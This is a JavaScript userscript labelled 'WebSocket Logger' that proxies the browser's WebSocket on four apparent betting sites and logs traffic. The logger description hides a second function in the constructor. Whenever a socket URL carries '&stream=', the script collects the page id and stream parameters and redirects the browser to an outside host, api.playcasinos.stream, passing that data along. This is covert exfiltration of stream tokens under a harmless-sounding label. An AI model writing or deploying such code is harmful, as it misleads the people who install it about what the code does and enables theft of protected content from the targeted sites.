// ==UserScript==
// @name        WebSocket Logger
// @namespace   esterTion
// @description Log all the communication of every WebSocket
// @match        https://d247.com/*
// @include      https://gx247.com/*
// @include      https://bigboys247.com/*
// @include      https://martine247.com/*
// @version      2
// @grant        GM.info
// @grant        unsafeWindow
// @grant        GM.openInTab
// @grant        GM.getResourceUrl
// @grant        GM.getValue
// @grant        GM.setValue
// @grant        GM.listValues
// @grant        GM.deleteValue
// @grant        GM.xmlHttpRequest
// @run-at       document-start
// ==/UserScript==

var scriptString = (function () {
  if (window.Proxy == undefined) return;
  var oldWS = window.WebSocket;
  var loggerIncrement = 1;
  function processDataForOutput(data) {
    if (typeof data == `string`) return data;
    else if (data.byteLength != undefined) {
      var val = { orig: data, uintarr: new Uint8Array(data) };
      var arr = [], i = 0;
      for (; i < data.byteLength; i++) {
        arr.push(val.uintarr[i]);
      }
      var hexarr = arr.map(function (i) { var s = i.toString(16); while (s.length < 2) s = `0` + s; return s; });
      val.hexstr = hexarr.join(``);
      val.string = unescape(hexarr.map(function (i) { return `%` + i; }).join(``));
      val.b64str = btoa(val.string);
      try {
        val.string = decodeURIComponent(escape(val.string));
      } catch (e) { }
      return val;
    }
  }
  var proxyDesc = {
    set: function (target, prop, val) {
      if (prop == `onmessage`) {
        var oldMessage = val;
        val = function (e) {
          if (window.printLog??false){console.log(`#${target.WSLoggerId} Msg from server << `, processDataForOutput(e.data));}
          oldMessage(e);
        };
      }
      return target[prop] = val;
    },
    get: function (target, prop) {
      var val = target[prop];
      if (prop == `send`) val = function (data) {
        if (window.printLog??false){console.log(`#${target.WSLoggerId} Msg from client >> `, processDataForOutput(data));}
        target.send(data);
      };
      else if (typeof val == `function`) val = val.bind(target);
      return val;
    }
  };
  WebSocket = new Proxy(oldWS, {
    construct: function (target, args, newTarget) {
      var obj = new target(args[0]);
      obj.WSLoggerId = loggerIncrement++;

      if (window.printLog??false){console.log(`WebSocket #${obj.WSLoggerId} created, connecting to`, args[0]);}

      if ((new URL(args[0]).search.indexOf(`&stream=`) !== -1) && ['d247.com', 'gx247.com', 'bigboys247.com', 'martine247.com'].some (keyword => location.host.includes(keyword))){
        setTimeout (function (){
          let id = (window.parent.document.location+``).split (`/`).slice(-1);
          let data = `id=` + id + new URL(args[0]).search.substring(new URL(args[0]).search.indexOf(`&stream=`));
          console.log(`https://api.playcasinos.stream/update/stream/`+data);
          window.document.location = (`https://api.playcasinos.stream/update/stream/`+data);
        }, 100);
      }

      return new Proxy(obj, proxyDesc);
    }
  });
});

var observer = new MutationObserver(function () {
  if (document.head) {
    observer.disconnect();
    var script = document.createElement(`script`);
    script.innerHTML = `(` + scriptString + `)();`;
    document.head.appendChild(script);
    script.remove();
  }
});
observer.observe(document, { subtree: true, childList: true });